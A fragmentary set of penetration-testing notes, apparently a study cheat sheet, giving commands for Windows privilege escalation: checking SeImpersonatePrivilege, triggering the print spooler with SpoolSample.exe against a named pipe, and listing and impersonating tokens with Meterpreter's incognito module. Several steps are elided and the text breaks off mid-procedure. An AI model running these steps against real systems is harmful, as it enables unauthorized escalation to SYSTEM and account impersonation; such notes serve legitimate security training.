...
1\. Check privilege (make sure have SeImpersonatePrivilege):\
`whoami /priv`

2\. Create the following file PrintSpooferNet.exe:
...
4\. In another shell/window, run SpoolSample.exe with the following arguments(change appsrv01 to the hostname):\
`SpoolSample.exe appsrv01 appsrv01/pipe/test`

## Meterpreter Incognito ##

You need SYSTEM to do this! (probably)

1\. In meterpreter shell, run the following:\
`load incognito`

2\. Run the following to list all tokens of users:\
`list_tokens -u`

3\. Run the following to impersonate (2 slashes!):\
